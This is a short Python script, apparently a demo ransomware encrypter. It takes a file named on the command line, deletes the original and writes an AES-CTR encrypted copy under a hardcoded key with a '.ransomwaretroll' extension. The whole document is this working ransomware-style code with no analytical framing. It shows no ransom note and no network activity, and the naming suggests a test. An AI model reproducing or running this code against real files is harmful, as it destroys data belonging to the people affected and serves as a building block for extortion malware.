import sys
import os
import pyaes

if len(sys.argv) < 2:
	print("Usage: python encrypter.py file_readable.txt")
	sys.exit(1)

file_name = sys.argv[1]
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"testsransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', "wb")
new_file.write(crypto_data)
new_file.close()
